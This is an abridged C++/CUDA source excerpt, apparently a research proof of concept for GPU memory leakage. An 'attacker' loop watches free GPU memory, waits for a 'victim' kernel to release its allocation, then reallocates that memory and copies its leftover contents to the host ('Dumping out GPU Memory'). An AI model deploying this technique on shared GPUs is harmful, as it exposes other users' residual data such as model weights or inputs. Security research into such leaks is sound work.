...
int main() {
  ...
  /*CUcontext attackContext;

  cuCtxCreate(&attackContext, CUctx_flags::CU_CTX_SCHED_AUTO, dev);

  cuCtxSetCurrent(attackContext);*/
  ...
  std::cout << "Number of elements in a: " << memsize / 4 << "\n";
  ...
  // Victim Kernel Exit System
  size_t prev_available_memsize = available_memsize;
  while (true) {
    ...
    if(available_memsize > prev_available_memsize && available_memsize + attacker_base_usage != total_memsize) {
      std::cout << " <-- Victim released global memory!\n";
      std::cout << "Dumping out GPU Memory..\n";
      cuda_try(cudaMalloc(&d_a, memsize));
      cuda_try(cudaMemcpy(a, d_a, memsize, cudaMemcpyDeviceToHost));

    }
    else if(available_memsize + attacker_base_usage == total_memsize) {
  ...
  //cuda_try(cuCtxDestroy(attackContext));
